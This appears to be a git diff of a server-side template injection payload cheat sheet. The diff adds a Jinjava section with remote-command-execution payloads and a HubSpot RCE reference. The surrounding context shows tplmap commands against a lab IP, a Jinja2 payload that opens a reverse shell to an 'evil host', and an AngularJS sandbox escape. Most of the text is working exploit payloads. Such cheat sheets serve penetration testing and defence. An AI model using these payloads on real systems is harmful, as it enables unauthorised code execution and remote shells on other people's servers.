@@ -11,6 +11,10 @@ python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=*&comment=supercomm
 python2.7 ./tplmap.py -u "http://192.168.56.101:3000/ti?user=InjectHere*&comment=A&link" --level 5 -e jade
 ```
 
+## Methodology
+
+![SSTI cheatsheet workflow](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20injections/Images/serverside.png?raw=true)
+
 ## Ruby
 
 ### Basic injection
@@ -141,7 +145,7 @@ ${x}
 [Official website](http://jinja.pocoo.org/)
 > Jinja2 is a full featured template engine for Python. It has full unicode support, an optional integrated sandboxed execution environment, widely used and BSD licensed.
 
-### Jinja 2 - Basic injection
+### Jinja2 - Basic injection
 
 ```python
 {{4*4}}[[5*5]]
@@ -211,6 +215,33 @@ Inject this template
 {{ config['RUNCMD']('bash -i >& /dev/tcp/xx.xx.xx.xx/8000 0>&1',shell=True) }} # connect to evil host
 ```
 
+## Jinjava
+
+
+### Jinjava - Basic injection
+
+```python
+{{'a'.toUpperCase()}} would result in 'A'
+{{ request }} would return a request object like com.[...].context.TemplateContextRequest@23548206
+```
+
+Jinjava is an open source project developped by Hubspot, available at [https://github.com/HubSpot/jinjava/](https://github.com/HubSpot/jinjava/)
+
+### Jinjava - Command execution 
+
+Fixed by https://github.com/HubSpot/jinjava/pull/230
+
+```python
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"new java.lang.String('xxx')\")}}
+
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"whoami\\\"); x.start()\")}}
+
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"netstat\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+
+
+{{'a'.getClass().forName('javax.script.ScriptEngineManager').newInstance().getEngineByName('JavaScript').eval(\"var x=new java.lang.ProcessBuilder; x.command(\\\"uname\\\",\\\"-a\\\"); org.apache.commons.io.IOUtils.toString(x.start().getInputStream())\")}}
+```
+
 ## Client Side Template Injection
 
 ### AngularJS
@@ -226,7 +257,7 @@ $eval('1+1')
 {{constructor.constructor('alert(1)')()}}
 ```
 
-## Thanks to
+## References
 
 * [https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/](https://nvisium.com/blog/2016/03/11/exploring-ssti-in-flask-jinja2-part-ii/)
 * [Yahoo! RCE via Spring Engine SSTI](https://hawkinsecurity.com/2017/12/13/rce-via-spring-engine-ssti/)
@@ -236,3 +267,4 @@ $eval('1+1')
 * [VelocityServlet Expression Language injection](https://magicbluech.github.io/2017/12/02/VelocityServlet-Expression-language-Injection/)
 * [Cheatsheet - Flask & Jinja2 SSTI - Sep 3, 2018 • By phosphore](https://pequalsnp-team.github.io/cheatsheet/flask-jinja2-ssti)
 * [RITSEC CTF 2018 WriteUp (Web) - Aj Dumanhug](https://medium.com/@ajdumanhug/ritsec-ctf-2018-writeup-web-72a0e5aa01ad)
+* [RCE in Hubspot with EL injection in HubL - @fyoorer](https://www.betterhacker.com/2018/12/rce-in-hubspot-with-el-injection-in-hubl.html?spref=tw)
